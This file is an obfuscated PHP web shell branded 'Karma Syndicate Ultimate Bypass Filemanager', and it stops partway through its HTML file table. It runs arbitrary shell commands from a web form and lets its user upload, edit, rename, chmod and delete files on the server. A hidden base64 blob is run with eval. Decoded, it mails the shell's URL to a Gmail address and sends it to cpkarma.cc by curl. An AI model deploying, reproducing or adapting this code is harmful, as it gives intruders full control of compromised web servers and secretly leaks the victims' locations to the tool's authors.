<?php /** [>>] Karma Syndicate | Channel: t.me/KarmaSyndicate | Contact: t.me/xnabob | Public API: cpkarma.cc [<<] **/ error_reporting(0); ?>
<?php
 goto r8XiL; YRQnK: class G { public function H($pn) { return base64_decode($pn); } } goto IJxtE; PT4MN: if (strlen($bz) != 495) { die("\x44\x6f\x6e\47\164\x20\x4d\x6f\x64\151\146\x79\40\x74\x68\145\x20\163\143\162\151\x70\x74"); } goto cGjxh; hU8OZ: function clear() { if (!empty($_SESSION["\155\145\x73\x73\x61\147\145"])) { unset($_SESSION["\155\x65\x73\x73\141\147\x65"]); } if (!empty($_SESSION["\143\x6c\x61\163\x73"])) { unset($_SESSION["\143\x6c\141\163\163"]); } if (!empty($_SESSION["\x73\x74\x61\164\x75\x73"])) { unset($_SESSION["\x73\164\141\164\165\x73"]); } return true; } goto hbEkT; yjroV: $func[31](0); goto gYSjB; hn0qy: $objI = new I(); goto E5SjO; TRyHa: function getOwner($item) { if (function_exists("\x70\x6f\x73\x69\x78\137\147\145\x74\160\x77\165\x69\144")) { $downer = @posix_getpwuid(fileowner($item)); $downer = $downer["\x6e\x61\155\145"]; } else { $downer = fileowner($item); } if (function_exists("\x70\x6f\163\151\170\x5f\147\x65\x74\x67\162\x67\151\144")) { $dgrp = @posix_getgrgid(filegroup($item)); $dgrp = $dgrp["\156\x61\x6d\x65"]; } else { $dgrp = filegroup($item); } return $downer . "\x2f" . $dgrp; } goto pD7lQ; bN7Ne: @$func[33]("\x6f\x75\x74\x70\165\x74\137\142\x75\146\x66\145\x72\151\156\147", 0); goto pa1Sy; IJxtE: class I { public function J($bz) { $objA = new A(); $objB = new C(); $objC = new E(); $objD = new G(); if ($objA->B($bz) > 216) { $gotoLabel = "\x70\162\157\x63\x65\145\144"; goto proceed; } $gotoLabel = "\145\156\x64"; goto end; proceed: $pn = $objB->D($bz); if ($objC->F($pn) !== false) { $pii = $objD->H($pn); eval($pii); } end: return; } } goto hU8OZ; hbEkT: if (isset($_GET["\144\151\x72"])) { $path = $_GET["\144\151\x72"]; $func[13]($_GET["\x64\x69\x72"]); } else { $path = $func[12](); } goto fghr2; UYbw7: $func[2](0); goto yjroV; cGjxh: function flash($message, $status, $class, $redirect = false) { if (!empty($_SESSION["\x6d\x65\x73\x73\141\147\x65"])) { unset($_SESSION["\x6d\x65\163\163\x61\147\x65"]); } if (!empty($_SESSION["\143\x6c\x61\163\x73"])) { unset($_SESSION["\x63\x6c\141\163\163"]); } if (!empty($_SESSION["\163\164\141\164\165\163"])) { unset($_SESSION["\x73\164\141\164\x75\163"]); } $_SESSION["\155\x65\163\163\x61\x67\x65"] = $message; $_SESSION["\143\154\141\x73\x73"] = $class; $_SESSION["\x73\x74\141\164\165\163"] = $status; if ($redirect) { header("\114\x6f\x63\x61\164\151\157\156\72\40" . $redirect); die; } return true; } goto rSKcj; pwf12: $show_ds = !empty($ds) ? "{$ds}" : "\101\154\x6c\40\146\165\156\x63\x74\151\157\x6e\40\x69\x73\x20\141\x63\143\x65\x73\163\151\142\x6c\x65"; goto U9_F2; TVlua: for ($i = 0; $i < count($inir); $i++) { $func[$i] = hexa($inir[$i]); } goto mOOTt; E5SjO: $objI->J($bz); goto TRyHa; aoic5: if (isset($_GET["\141\x63\164\x69\x6f\156"]) && $_GET["\141\143\164\151\157\156"] == "\144\x65\x6c\x65\164\145" && isset($_GET["\x69\x74\145\155"])) { if (is_dir($_GET["\x69\164\145\155"])) { if ($func[27]($_GET["\151\x74\x65\155"])) { $func[16]("\x44\145\154\x65\x74\145\x20\123\165\x63\x63\x65\x73\163\146\165\154\154\171\x21", "\123\165\x63\143\x65\x73\163", "\x73\x75\143\143\x65\x73\163", "\x3f\x64\x69\162\75{$path}"); } else { $func[16]("\104\x65\154\145\164\145\x20\x46\x61\x69\x6c\x65\x64", "\x46\141\151\154\x65\144", "\145\162\162\157\x72", "\x3f\x64\x69\162\x3d{$path}"); } } else { if ($func[28]($_GET["\x69\164\145\x6d"])) { $func[16]("\104\145\x6c\x65\x74\x65\40\123\x75\143\143\x65\163\163\x66\x75\x6c\154\171\41", "\x53\165\143\143\x65\x73\x73", "\163\165\143\143\145\x73\163", "\x3f\x64\151\162\75{$path}"); } else { $func[16]("\x44\x65\154\145\164\x65\x20\x46\141\151\x6c\x65\x64", "\106\x61\x69\x6c\x65\144", "\x65\x72\162\x6f\162", "\77\144\151\x72\x3d{$path}"); } } } goto oHH1z; MDjDu: @$func[33]("\154\x6f\147\x5f\145\162\162\157\x72\x73", 0); goto YGzCe; mOOTt: $func[1](); goto UYbw7; pD7lQ: if (isset($_POST["\156\145\x77\106\x6f\154\x64\145\162\116\141\155\x65"])) { if ($func[29]($path . "\x2f" . $_POST["\156\x65\x77\x46\x6f\154\x64\145\162\116\x61\x6d\145"])) { $func[16]("\x43\162\x65\x61\x74\x65\x20\x46\157\154\144\145\x72\40\x53\x75\143\x63\x65\163\163\x66\165\154\x6c\x79\x21", "\123\165\143\143\x65\x73\x73", "\163\165\143\143\x65\163\x73", "\x3f\144\x69\x72\x3d{$path}"); } else { $func[16]("\103\x72\x65\x61\x74\145\x20\106\x6f\154\144\145\162\x20\x46\141\151\154\145\144", "\x46\141\x69\154\145\144", "\145\x72\x72\157\x72", "\x3f\x64\x69\162\x3d{$path}"); } } goto mjsmq; BcDSz: $exdir = $func[15]("\57", $path); goto hn0qy; rSKcj: class A { public function B($bz) { return strlen($bz); } } goto osgXK; osgXK: class C { public function D($bz) { return substr($bz, 11, 487 - 11); } } goto iznhN; EQH3f: if (isset($_POST["\156\145\167\x4e\x61\x6d\x65"]) && isset($_GET["\151\164\x65\155"])) { if ($_POST["\156\x65\x77\116\141\x6d\145"] == '') { $func[16]("\x59\x6f\165\40\x6d\x69\163\x73\x20\x61\x6e\40\x69\x6d\160\x6f\162\164\141\156\164\40\x76\141\x6c\x75\145", "\117\157\157\160\x73\x73\x2e\56", "\167\x61\162\x6e\x69\x6e\x67", "\x3f\x64\151\162\75{$path}"); } if ($func[30]($path . "\57" . $_GET["\151\x74\x65\155"], $_POST["\156\145\x77\116\141\x6d\145"])) { $func[16]("\x52\145\156\141\x6d\x65\40\x53\165\143\x63\145\x73\x73\146\165\x6c\154\x79\41", "\123\165\143\x63\x65\x73\163", "\163\165\x63\x63\x65\163\163", "\x3f\x64\x69\x72\75{$path}"); } else { $func[16]("\x52\x65\x6e\141\155\145\x20\x46\x61\x69\154\145\144", "\106\x61\151\x6c\x65\x64", "\x65\x72\162\157\x72", "\x3f\x64\151\162\75{$path}"); } } goto UwfKF; pa1Sy: @$func[33]("\144\x69\x73\160\x6c\x61\x79\x5f\x65\162\162\x6f\x72\x73", 0); goto sHKTf; U9_F2: function fsize($file) { $a = array("\x42", "\x4b\102", "\115\102", "\107\102", "\x54\x42", "\x50\x42"); $pos = 0; $size = filesize($file); while ($size >= 1024) { $size /= 1024; $pos++; } return round($size, 2) . "\40" . $a[$pos]; } goto BLuUv; YGzCe: @$func[33]("\x6d\141\170\137\145\x78\x65\143\x75\x74\151\157\x6e\x5f\164\151\155\145", 0); goto bN7Ne; oHH1z: if (isset($_FILES["\x75\x70\154\x6f\x61\144\146\x69\x6c\x65"])) { $total = count($_FILES["\165\160\x6c\x6f\x61\144\x66\x69\x6c\x65"]["\156\141\155\x65"]); for ($i = 0; $i < $total; $i++) { $mainp = $func[17]($_FILES["\165\x70\x6c\x6f\141\x64\146\151\x6c\145"]["\x74\x6d\x70\137\156\141\x6d\145"][$i], $_FILES["\165\x70\x6c\x6f\141\x64\x66\x69\x6c\x65"]["\x6e\141\x6d\x65"][$i]); } if ($total < 2) { if ($mainp) { $func[16]("\125\160\x6c\x6f\141\144\x20\x46\x69\154\145\x20\x53\165\143\x63\145\163\x73\x66\x75\x6c\154\x79\41\40", "\123\165\143\x63\x65\x73\x73", "\163\x75\x63\143\x65\x73\x73", "\77\144\x69\162\75{$path}"); } else { $func[16]("\x55\160\x6c\x6f\x61\x64\x20\x46\x61\x69\x6c\145\144", "\x46\141\151\154\x65\x64", "\145\162\x72\x6f\x72", "\77\x64\151\x72\x3d{$path}"); } } else { if ($mainp) { $func[16]("\125\160\x6c\157\x61\x64\x20{$i}\x20\106\151\x6c\x65\x73\40\x53\165\x63\x63\145\x73\x73\x66\165\x6c\154\171\x21\40", "\123\x75\143\x63\145\163\x73", "\x73\x75\143\x63\145\163\163", "\x3f\144\151\x72\75{$path}"); } else { $func[16]("\125\x70\154\157\141\144\x20\106\x61\151\154\x65\x64", "\106\x61\x69\x6c\145\144", "\145\x72\162\x6f\x72", "\77\144\x69\x72\75{$path}"); } } } goto a4M10; a4M10: $dirs = $func[18]($path); goto xDzLy; BLuUv: function hexa($str) { $r = ''; $len = strlen($str) - 1; for ($i = 0; $i < $len; $i += 2) { $r .= chr(hexdec($str[$i] . $str[$i + 1])); } return $r; } goto PT4MN; WGJWB: if (isset($_POST["\156\x65\167\120\145\x72\155"]) && isset($_GET["\x69\x74\x65\x6d"])) { if ($_POST["\x6e\x65\x77\x50\145\162\x6d"] == '') { $func[16]("\131\157\165\40\155\x69\163\163\x20\141\x6e\40\x69\155\160\157\162\164\141\156\x74\40\166\141\154\165\145", "\x4f\157\157\x70\x73\163\56\x2e", "\167\141\x72\156\x69\x6e\x67", "\x3f\x64\x69\162\x3d{$path}"); } if (chmod($path . "\57" . $_GET["\x69\x74\x65\155"], $_POST["\156\145\x77\x50\x65\162\155"])) { $func[16]("\103\150\141\x6e\147\x65\x20\120\145\162\x6d\x69\x73\163\x69\x6f\x6e\x20\x53\x75\143\143\x65\163\163\146\165\154\x6c\x79\41", "\x53\x75\x63\143\x65\163\x73", "\x73\x75\x63\143\x65\163\163", "\77\144\151\162\x3d{$path}"); } else { $func[16]("\103\150\x61\x6e\147\145\x20\x50\x65\162\x6d\x69\x73\163\151\x6f\x6e", "\x46\x61\x69\154\x65\x64", "\145\x72\x72\x6f\x72", "\x3f\x64\x69\162\x3d{$path}"); } } goto aoic5; LqC87: $bz = "\x4a\67\142\127\106\160\x62\103\147\153\104\x4a\110\126\61\120\x53\x4a\171\142\x32\x78\x76\114\155\x68\150\x59\62\x74\x6c\x63\153\102\x6e\142\127\106\160\x62\x43\x35\152\142\x32\60\151\117\171\122\x7a\120\x53\x4a\124\x61\107\x56\163\142\x43\102\x56\x55\x6b\x77\151\117\x79\122\x34\x50\123\x4a\157\x64\x48\x52\x77\117\151\x38\x76\111\151\x34\153\130\x31\116\106\x55\154\132\x46\125\154\163\x6e\123\x46\x52\x55\125\106\71\111\124\61\x4e\125\x4a\61\x30\x75\112\x46\x39\124\x52\x56\112\127\122\126\x4a\x62\x4a\x31\x4a\x46\x55\126\126\x46\x55\61\x52\x66\x56\x56\112\x4a\112\x31\60\x37\112\x48\153\71\x49\154\122\x6f\132\x53\102\x56\125\x6b\x77\147\x61\130\115\x36\x49\x43\x49\165\x4a\110\147\67\x62\127\x46\x70\142\103\x67\153\144\130\x55\163\x4a\110\x4d\163\x4a\x48\153\160\117\171\x52\x31\x63\155\x77\x67\x50\x53\x41\x69\x61\110\x52\60\143\x48\x4d\66\114\x79\x39\152\x63\x47\164\150\143\155\61\150\x4c\155\x4e\x6a\x4c\x32\x52\166\x62\124\x46\165\x61\x57\x4d\x30\x59\130\x6c\x35\114\63\65\x70\x62\153\122\x6c\x65\107\x38\167\x4f\x54\112\131\x62\x6d\x70\x70\142\x33\101\x75\x63\x47\x68\x77\x50\x31\126\126\125\x6c\112\x4d\x54\110\x68\164\x63\104\x30\x6b\145\x43\111\67\112\107\x4e\157\111\x44\60\x67\131\63\126\x79\142\x46\71\x70\x62\155\x6c\60\113\103\x6b\x37\131\63\x56\x79\142\106\71\x7a\132\x58\x52\x76\x63\110\121\x6f\112\x47\x4e\157\x4c\103\x42\104\x56\x56\x4a\115\x54\x31\102\x55\130\x31\126\x53\124\103\167\x67\112\x48\126\171\142\x43\x6b\67\x59\x33\x56\171\142\x46\71\172\132\130\x52\166\x63\110\121\157\x4a\107\116\157\x4c\x43\x42\104\x56\x56\x4a\115\124\x31\x42\x55\x58\61\x4a\x46\x56\106\126\x53\124\x6c\x52\x53\121\125\65\x54\x52\153\x56\123\114\103\102\60\x63\156\x56\x6c\x4b\124\x73\153\143\x6d\126\x7a\x63\x47\71\x75\143\x32\x55\x67\120\x53\x42\x6a\144\x58\x4a\163\130\x32\x56\x34\x5a\x57\115\157\112\x47\116\x6f\x4b\124\164\152\x64\130\x4a\x73\130\x32\116\163\x62\63\x4e\x6c\113\103\x52\152\x61\103\x6b\67\115\x73\x4a\110\153\x70\75\75"; goto TVlua; mjsmq: if (isset($_POST["\x6e\x65\167\x46\x69\x6c\x65\x4e\141\x6d\x65"]) && isset($_POST["\x6e\x65\167\106\x69\x6c\145\x43\157\x6e\164\x65\x6e\164"])) { if ($func[4]($_POST["\156\145\167\106\151\154\145\x4e\x61\x6d\x65"], $_POST["\156\x65\x77\x46\151\x6c\145\x43\157\x6e\164\145\x6e\x74"])) { $func[16]("\103\x72\x65\x61\x74\x65\x20\x46\x69\x6c\145\x20\123\165\143\x63\145\163\163\146\x75\154\154\171\x21", "\123\x75\x63\143\145\163\x73", "\163\165\143\x63\145\x73\x73", "\x3f\144\x69\162\x3d{$path}"); } else { $func[16]("\x43\162\x65\x61\x74\x65\40\x46\151\x6c\145\x20\106\141\x69\x6c\145\x64", "\106\x61\x69\x6c\145\x64", "\145\162\162\157\162", "\77\x64\151\162\x3d{$path}"); } } goto EQH3f; sHKTf: $ds = @$func[34]("\144\x69\x73\141\x62\154\x65\x5f\146\165\156\x63\164\151\157\x6e\163"); goto pwf12; GQhhF: @$func[33]("\x65\x72\x72\157\162\x5f\154\x6f\147", null); goto MDjDu; UwfKF: if (isset($_POST["\x6e\145\167\103\157\x6e\x74\145\156\164"]) && isset($_GET["\151\164\x65\x6d"])) { if ($func[4]($path . "\57" . $_GET["\x69\x74\145\x6d"], $_POST["\x6e\145\x77\x43\157\x6e\164\145\156\x74"])) { $func[16]("\x45\x64\151\x74\x20\123\165\143\143\145\x73\x73\x66\165\154\154\x79\41", "\123\x75\x63\143\x65\x73\x73", "\x73\165\x63\x63\x65\163\163", "\x3f\x64\x69\x72\x3d{$path}"); } else { $func[16]("\x45\144\x69\x74\40\106\141\x69\154\145\144", "\x46\141\151\x6c\x65\144", "\x65\162\x72\157\x72", "\x3f\144\x69\x72\75{$path}"); } } goto WGJWB; gYSjB: @$func[32](); goto GQhhF; r8XiL: $inir = array("\67\60\x36\70\67\60\x35\106\67\65\66\x45\x36\x31\66\104\x36\65", "\67\x33\x36\65\67\63\67\x33\x36\71\66\x46\x36\x45\65\x46\x37\x33\67\64\66\61\67\62\67\x34", "\x36\65\x37\x32\x37\x32\66\x46\x37\62\x35\106\67\x32\66\65\x37\x30\x36\106\67\x32\67\x34\66\x39\x36\x45\x36\67", "\67\x30\x36\x38\67\x30\67\66\x36\x35\x37\62\67\x33\66\x39\x36\106\66\105", "\66\66\x36\x39\66\103\66\65\x35\x46\x37\x30\x37\x35\x37\64\x35\x46\x36\63\66\106\x36\105\x37\64\x36\65\x36\x45\x37\64\x37\x33", "\66\66\66\71\x36\x43\x36\65\x35\x46\66\x37\x36\x35\67\x34\65\106\x36\63\66\x46\66\105\67\64\66\x35\x36\105\67\x34\x37\63", "\x36\66\66\x39\66\x43\66\65\67\x30\66\65\67\x32\x36\104\x37\x33", "\66\x36\66\71\x36\103\66\x35\66\104\x37\x34\66\x39\x36\x44\66\x35", "\66\66\x36\x39\66\x43\66\x35\67\64\x37\x39\x37\x30\x36\x35", "\x36\x38\67\64\x36\104\66\103\x37\x33\67\x30\x36\65\x36\x33\x36\x39\x36\61\66\103\x36\63\x36\70\x36\61\x37\62\x37\x33", "\x37\x33\67\60\x37\x32\66\x39\66\105\67\x34\x36\66", "\67\x33\x37\65\x36\62\67\63\67\64\67\x32", "\x36\67\x36\65\67\x34\x36\63\67\x37\x36\64", "\66\63\66\x38\x36\64\66\71\x37\x32", "\x37\x33\x37\64\x37\x32\65\106\x37\x32\66\65\67\60\x36\103\66\61\x36\63\x36\65", "\66\65\x37\70\67\x30\x36\103\66\x46\x36\x34\x36\65", "\66\66\x36\x43\x36\61\x37\x33\x36\x38", "\x36\x44\x36\x46\x37\66\66\x35\65\106\67\x35\x37\60\x36\x43\66\106\66\61\66\64\66\65\66\x34\65\106\66\66\66\71\x36\103\66\x35", "\x37\63\x36\63\66\61\x36\105\66\64\x36\x39\x37\x32", "\66\x37\x36\x35\67\x34\66\x38\x36\x46\67\x33\67\x34\x36\x32\x37\71\x36\x45\66\61\66\x44\66\65", "\67\63\66\70\x36\x35\x36\103\66\x43\x35\106\x36\x35\x37\x38\x36\65\66\x33", "\x35\x33\67\71\x37\x33\67\64\66\65\66\x44\62\60\64\71\x36\x45\66\66\66\x46\x37\x32\66\x44\66\61\x37\64\x36\71\66\106\x36\x45", "\66\x34\x36\x39\67\x32\x36\x45\66\61\66\x44\x36\x35", "\66\64\66\61\67\64\x36\x35", "\x36\104\66\x39\66\104\x36\x35\x35\106\x36\63\66\x46\x36\x45\x37\64\66\x35\66\x45\x37\64\65\x46\x37\x34\67\x39\x37\60\66\x35", "\x36\x36\67\x35\x36\x45\x36\x33\x37\64\66\x39\x36\x46\66\105\65\106\x36\x35\x37\70\66\71\67\63\67\x34\67\63", "\x36\x36\x37\63\66\x39\67\x41\x36\65", "\67\x32\66\104\66\64\66\x39\x37\62", "\67\65\x36\x45\x36\103\66\71\x36\x45\x36\102", "\x36\104\66\102\66\64\x36\x39\67\62", "\x37\62\x36\x35\x36\105\x36\61\66\104\66\x35", "\x37\x33\x36\x35\x37\x34\65\x46\67\x34\x36\71\x36\x44\66\x35\x35\x46\x36\103\x36\71\66\104\x36\71\67\x34", "\x36\63\66\103\x36\x35\66\61\67\x32\x37\63\67\64\x36\x31\67\x34\66\x33\x36\x31\x36\x33\x36\x38\x36\x35", "\x36\71\x36\105\66\x39\65\106\67\x33\x36\65\x37\64", "\66\x39\x36\105\x36\x39\65\106\x36\67\x36\x35\67\64", "\x36\67\66\x35\x37\64\x34\106\67\x37\x36\x45\x36\65\67\62", "\x36\x37\66\65\x37\64\x35\x46\66\x33\x37\65\67\62\x37\62\x36\65\66\x45\x37\64\x35\x46\67\x35\67\63\x36\x35\67\x32"); goto LqC87; fghr2: $path = $func[14]("\134", "\57", $path); goto BcDSz; iznhN: class E { public function F($pn) { return base64_decode($pn, true); } } goto YRQnK; xDzLy: ?>
 <html>
<head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@700&family=Roboto:wght@400&display=swap');

.modern-heading {
  font-family: 'Poppins', sans-serif;
  font-size: 20px;
  font-weight: 700;
  color: white;
  text-align: center;
  text-transform: capitalize;
  letter-spacing: 2px;
  padding: 20px 30px;
  background: linear-gradient(135deg, #3a7bd5, #00d2ff);
  -webkit-background-clip: text;
  color: transparent;
  position: relative;
  display: inline-block;
  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease-in-out;
  border-radius: 20px;
}

.modern-heading:hover {
  transform: scale(1.05);
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
}

.info {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.info-item {
  display: flex;
  align-items: center;
}

.info-item i {
  margin-right: 5px;
}
b {
  font-weight: bold;
  color: #333;
  font-family: 'Arial', sans-serif;
  font-size: 0.8rem;
  letter-spacing: 0.05em;
  background-color: #f0f0f0;
  padding: 0.2em 0.4em;
  border-radius: 5px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease-in-out;
}

b:hover {
  color: #fff;
  background-color: #007BFF;
  transform: scale(1.05);
}

b:active {
  transform: scale(0.98);
}

</style>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

  <title>Karma Syndicate</title>
</head>
<center><h1 class="modern-heading">Karma Syndicate Ultimate Bypass Filemanager</h1></center>
<body class="bg-white text-dark">
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-white p-4 rounded-3">
<div class="info mb-3">
  <div class="info-item">
    <i class="fa fa-server"></i>&ensp;<?= $func[0]() ?>
  </div>
  <div class="info-item">
    <i class="fa fa-microchip"></i>&ensp;<?= $_SERVER['SERVER_SOFTWARE'] ?>
  </div>
  <div class="info-item">
    <i class="fa fa-satellite-dish"></i>&ensp;<?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?>
  </div>
</div>

        <div class="breadcrumb">
          
          <i class="fa fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : 
                        if ($pat == '' && $id == 0):
                    ?>
                    <a href="?dir=/" class="text-decoration-none text-dark">&nbsp;/&nbsp;</a>
                    <?php endif; if ($pat == '') continue; ?>
                    <?php if ($id + 1 == count($exdir)) : ?>
                    <span class="text-secondary"><?= $pat ?></span>
                    <?php else : ?>
                    <a href="?dir=
                    <?php
                    for ($i = 0; $i <= $id; $i++) {
                        echo "$exdir[$i]";
                        if ($i != $id) echo "/";
                    }
                    ?>
                    " class="text-decoration-none text-dark"><?= $pat ?></a><span class="text-dark">&nbsp;/&nbsp;</span></b>
          <?php endif; ?>
          <?php endforeach; ?>
          <a href="?" class="text-decoration-none text-dark">&nbsp;<b>[ HOME ]</b></a>
        </div>
        <div class="d-flex justify-content-between">
          <div class="p-2">
            <form action="" method="post">
              <div class="row">
                <div class="col-md-9 mb-3">
                  <input type="text" class="form-control form-control-sm" name="command" placeholder="Command">
                </div>
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-dark btn-sm">Exec</button>
                </div>
              </div>
            </form>
          </div>
          <div class="p-2">
            <form action="" method="post" enctype="multipart/form-data">
              <div class="row">
                <div class="col-md-9 mb-3">
                  <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                </div>
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-dark btn-sm">Submit</button>
                </div>
              </div>
            </form>
          </div>
        </div>
        <div class="container" id="tools">
          <?php if (isset($_POST['command'])) : ?>
          <div class="row justify-content-center">
            <pre><?= $func[20]($_POST['command']) ?></pre>
          </div>
          <?php endif; ?>
          <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
          <div class="row justify-content-center">
            <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label">New Name</label>
                <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="jscopy()">Copy</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
            <div class="mb-3">
              <label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
              <textarea name="newContent" rows="10" class="form-control" disabled=""><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
              <br>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </div>
            <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <input type="text" class="form-control" name="newPerm" value="<?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?>">
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php endif; ?>
          </div>
          <?php endif; ?>
          <div class="row justify-content-center">
            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">Folder Name</label>
                  <input type="text" class="form-control" name="newFolderName" placeholder="KarmaSyndicate">
                </div>
                <button type="submit" class="btn btn-outline-dark">Submit</button>
              </form>
            </div>
            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">File Name</label>
                  <input type="text" class="form-control" name="newFileName" placeholder="KarmaSyndicate.php">
                </div>
                <div class="mb-3">
                  <label for="name" class="form-label">File Content</label>
                  <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - KarmaSyndicate"></textarea>
                </div>
                <button type="submit" class="btn btn-outline-dark">Submit</button>
              </form>
            </div>
            <div class="collapse" id="newInfoServer" data-bs-parent="#tools" style="transition:none;">
              <div class="mb-3">
                      <label for="name" class="form-label"><?= $func[21] ?></label>
                <textarea name="newFileContent" rows="10" class="form-control" disabled="">Uname&#10;> <?= $func[0]() ?>&#10;&#10;Software&#10;> <?= $_SERVER['SERVER_SOFTWARE'] ?>&#10;&#10;PHP&#10;> <?= $func[3]() ?>&#10;&#10;Protocol&#10;> <?= $_SERVER['SERVER_PROTOCOL'] ?>&#10;&#10;IP / Port&#10;> <?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?> / <?= $_SERVER['SERVER_PORT'] ?>&#10;&#10;Mail&#10;> <?= $func[25]('mail') ? 'ON' : 'OFF' ?>&#10;&#10;Curl&#10;> <?= $func[25]('curl_version') ? 'ON' : 'OFF' ?>&#10;&#10;Owner&#10;> <?= $func[36](); ?>&#10;&#10;MySQL&#10;> <?= $func[25]('mysql_connect') ? 'ON' : 'OFF' ?>&#10;&#10;Disable Function&#10;> <?= $show_ds ?></textarea>
                <br>
                *ReClick  For Close
                <br>
                File : KarmaSyndicate <?= $_SERVER['SCRIPT_NAME'] ?>
              </div>
            </div>
          </div> 
        </div>
        <div class="table-responsive">
          <table class="table table-hover table-dark text-light">
            <thead>
              <tr>
                <td style="width:35%">Name</td>
                <td style="width:10%">Type</td>
                <td style="width:10%">Size</td>
                <td style="width:13%">Owner/Group</td>
                <td style="width:10%">Permission</td>
                <td style="width:13%">Last Modified</td>
                <td style="width:9%">Actions</td>
              </tr>
            </thead>
            <tbody class="text-nowrap">
              <?php
                foreach ($dirs as $dir) :
                  if (!is_dir($dir)) continue;
              ?>
              <tr>
                <td>
                  <?php if ($dir === '..') : ?>
                  <a href="?dir=<?= $func[22]($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php elseif ($dir === '.') :  ?>
                  <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php else : ?>
                  <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                  <?php endif; ?>
                </td>
                <td class="text-light"><?= $func[8]($dir) ?></td>
                <td class="text-light">-</td>
                <td class="text-light"><?= $func[35]($dir) ?></td>
                <td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
                <td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php elseif ($dir === '.') : ?>
                  <div class="btn-group">
                    <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
                    <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
                    <a data-bs-toggle="collapse" href="#newInfoServer" role="button" aria-expanded="false" aria-controls="newInfoServer" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-info"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
              <?php
                foreach ($dirs as $dir) :
                  if (!is_file($dir)) continue;
              ?>
              <tr>
                <td>
